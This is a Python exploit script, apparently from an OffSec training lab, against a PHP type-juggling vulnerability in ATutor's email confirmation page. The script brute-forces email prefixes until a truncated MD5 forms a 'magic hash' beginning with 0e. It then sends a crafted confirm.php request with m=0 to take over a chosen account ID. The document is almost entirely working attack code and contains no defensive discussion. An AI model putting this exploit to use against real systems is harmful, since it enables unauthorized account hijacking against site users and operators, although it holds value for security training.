import hashlib
import string
import requests
import itertools
import re
import sys

# date: 2016-03-10 16:00:00
# account id: 1
# domain: offsec.local

if len(sys.argv) != 5:
	print(f"usage: {sys.argv[0]}, <account id> <email domain> <creation date> <email prefix length>")
	sys.exit(-1)

account_id = str(sys.argv[1])
domain = str(sys.argv[2])
creation = str(sys.argv[3])
prefix_len = int(sys.argv[4])

def calculate_hash(input: str) -> str:
	''' Creates an MD5 hash of the string that is passed and returns the first 10 chars/bytes'''
	return hashlib.md5(input.encode()).hexdigest()[:10]


def generate(account_id: str, domain: str, creation: str, prefix_len: int) -> str:
	''' Generates possible emails used for exploiting a type juggling vuln in Atutor'''
	count = 0
	for _ in itertools.product(string.ascii_lowercase, repeat=int(prefix_len)):
		
		result = ''.join(_)
		email = f"{result}@{domain}{creation}{account_id}"

		valid_email = f"{result}@{domain}"
		email_hash = calculate_hash(email)

		if re.match(r'0[eE]\d+$', email_hash):
			print(f"[!] Valid Email Found after {count} iterations: {valid_email} - Magic Hash Value: {email_hash}")
			return valid_email
		else:
			count += 1
			pass

def account_takeover(magic_email: str):
	takeover_payload = f"http://atutor/ATutor/confirm.php?e={magic_email}&m=0&id={account_id}"
	print(f"Attempting to takeover account id: {account_id} with {magic_email}", takeover_payload)

	r = requests.get(takeover_payload, allow_redirects=False)
	
	# if we get a http 302, then the ato worked.
	if r.status_code == 302:
		return True
	else:
		return False

def main():
	first_valid_email = generate(account_id, domain, creation, prefix_len)

	if account_takeover(first_valid_email):
		print(f"Successfully hijacked! (New email: {first_valid_email})")

if __name__ == "__main__":
	main()